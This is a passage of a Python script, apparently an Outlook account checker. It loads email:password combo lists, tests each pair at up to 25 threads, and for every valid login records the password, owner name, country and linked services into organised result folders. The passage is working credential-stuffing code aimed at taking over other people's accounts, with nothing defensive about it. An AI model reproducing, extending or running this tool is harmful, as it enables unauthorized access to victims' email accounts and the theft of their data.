                print(f"{Colors.RED}❌ No valid line found in the file (email:pass format).{Colors.END}")
                sys.exit(1)
            
            combo_filename = os.path.basename(file_path).replace('.txt', '')
            result_manager = ResultManager(combo_filename, mode_name)
            
            threads = {"2": 1, "3": 10, "4": 25}[choice]
            mode_names = {"2": f"{Colors.BLUE}Series{Colors.END}", "3": f"{Colors.YELLOW}10 Thread{Colors.END}", "4": f"{Colors.RED}25 Thread{Colors.END}"}
            
            inbox_display = f"{Colors.GREEN}Full Capture (26 Services){Colors.END}" if inbox_mode == "A" else f"{Colors.MAGENTA}Manuel ({len(custom_services)} Inbox){Colors.END}"
            
            print(f"\n{Colors.CYAN}{'═'*64}{Colors.END}")
            print(f"{Colors.CYAN}📋 Account: {Colors.WHITE}{len(lines)}{Colors.END}")
            print(f"{Colors.CYAN}🔧 Mod: {mode_names[choice]}")
            print(f"{Colors.CYAN}📥 Inbox: {inbox_display}")
            print(f"{Colors.CYAN}📁 Folder: {Colors.WHITE}{result_manager.base_folder}{Colors.END}")
            print(f"{Colors.CYAN}{'═'*64}{Colors.END}\n")
            
            live_stats = LiveStats(len(lines))
            
            if threads == 1:
                # Seri işlem
                for i, line in enumerate(lines, 1):
                    try:
                        email, password = line.split(':', 1)
                        email = email.strip()
                        password = password.strip()
                        
                        result = checker.check(email, password)
                        live_stats.update(result["status"])
                        
                        if result["status"] == "HIT":
                            services_found = [svc for svc, found in result["services"].items() if found]
                            country_display = f" | {result['country']}" if result['country'] else ""
                            name_display = f" | {result['name']}" if result['name'] else ""
                            
                            print(f"\n{Colors.GREEN}✅ HIT: {email[:30]}{name_display}{country_display}{Colors.END}")
                            print(f"{Colors.CYAN}   └─ Services ({len(services_found)}): {', '.join(services_found)}{Colors.END}")
                            
                            result_manager.save_hit(email, password, result)
                        
                        live_stats.print_stats(Colors)
                        time.sleep(1.5)
                        
                    except ValueError:
                        live_stats.update("ERROR")
                        live_stats.print_stats(Colors)
                        continue
            else:
                # Multi-threading
                import concurrent.futures
                
                def process_account(line_data):
                    line, index = line_data
                    
                    try:
                        email, password = line.split(':', 1)
                        email = email.strip()
                        password = password.strip()
                        
                        thread_checker = OutlookChecker(debug=False, custom_services=custom_services)
                        result = thread_checker.check(email, password)
                        
                        live_stats.update(result["status"])
                        
                        if result["status"] == "HIT":
                            services_found = [svc for svc, found in result["services"].items() if found]
                            country_display = f" | {result['country']}" if result['country'] else ""
                            name_display = f" | {result['name']}" if result['name'] else ""
                            
                            print(f"\n{Colors.GREEN}✅ HIT: {email[:30]}{name_display}{country_display}{Colors.END}")
                            print(f"{Colors.CYAN}   └─ Services ({len(services_found)}): {', '.join(services_found)}{Colors.END}")
                            
                            result_manager.save_hit(email, password, result)
                        
                        live_stats.print_stats(Colors)
                        time.sleep(0.8)
                        
                    except Exception as e:
                        live_stats.update("ERROR")
                        live_stats.print_stats(Colors)
                
                with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                    line_data = [(line, i) for i, line in enumerate(lines, 1)]
                    executor.map(process_account, line_data)
            
            # Son istatistikler
            final_stats = live_stats.get_stats()
            
            print(f"\n\n{Colors.CYAN}{'╔'*64}{Colors.END}")
            print(f"{Colors.BOLD}{Colors.MAGENTA}                   📊 RESULTS{Colors.END}")
            print(f"{Colors.CYAN}{'╠'*64}{Colors.END}")
            print(f"{Colors.GREEN}✅ HIT:      {final_stats['hits']}{Colors.END}")
            print(f"{Colors.RED}❌ BAD:      {final_stats['bads']}{Colors.END}")
            print(f"{Colors.YELLOW}⚠️  ERROR:    {final_stats['errors']}{Colors.END}")
            print(f"{Colors.WHITE}📊 TOPLAM:   {final_stats['checked']}/{final_stats['total']}{Colors.END}")
            print(f"{Colors.BLUE}⚡ AVG CPM:  {final_stats['cpm']:.0f}{Colors.END}")
            print(f"{Colors.MAGENTA}⏱️  DURATION:     {time.strftime('%H:%M:%S', time.gmtime(final_stats['elapsed']))}{Colors.END}")
            print(f"{Colors.CYAN}{'╠'*64}{Colors.END}")
            print(f"{Colors.CYAN}📁 Folder:{Colors.WHITE}{result_manager.base_folder}{Colors.END}")
            print(f"{Colors.CYAN}{'╚'*64}{Colors.END}")
            
            if final_stats['hits'] > 0:
                print(f"\n{Colors.GREEN}✅ The results have been recorded.!{Colors.END}")
                print(f"{Colors.WHITE}   - Services: {result_manager.services_folder}{Colors.END}")
                print(f"{Colors.WHITE}   - Countries: {result_manager.countries_folder}{Colors.END}")
            
        except FileNotFoundError:
            print(f"{Colors.RED}❌ File not found!{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}❌ Error: {str(e)}{Colors.END}")
    
    print(f"\n{Colors.GREEN}✨ Completed!{Colors.END}")
    print(f"{Colors.CYAN}{'╚'*64}{Colors.END}")

if __name__ == "__main__":
    main()
